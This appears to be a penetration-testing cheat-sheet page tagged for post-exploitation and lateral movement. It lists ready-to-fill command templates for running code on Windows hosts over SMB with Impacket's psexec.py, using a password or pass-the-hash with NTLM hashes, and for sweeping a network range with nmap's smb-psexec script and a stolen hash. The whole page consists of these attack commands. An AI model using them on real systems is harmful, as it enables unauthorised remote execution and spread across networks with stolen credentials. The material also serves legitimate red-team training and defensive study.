---
author(s):
  - Userware
tags:
  - post-exploitation
  - lateral-movement
  - psexec
  - network-protocols
  - smb
  - windows
---
# Unix Shell

## 01 - Impacket

```
$ psexec.py [<domain>/]<username>:<password>@<IP> [-codecs <codec>]
```

Pass the Hash

```
$ psexec.py <username>@<IP> -hashes <ntlm_hash> [-codecs <codec>]

$ psexec.py [<domain>/]<username>@<IP> -hashes 0000000000000000000000000000000:<nt_hash>

$ psexec.py [<domain>/]<username>@<IP> -hashes aad3b435b51404eeaa3b435b51404ee:<nt_hash>

$ psexec.py [<domain>/]<username>@<IP> -hashes :<nt_hash>
```

## 02 - Network Mapper

```
$ nmap -p 445 -Pn --script smb-psexec --script-args 'smbuser=<username>,smbhash=<nt_hash>' <IP>/<CIDR>
```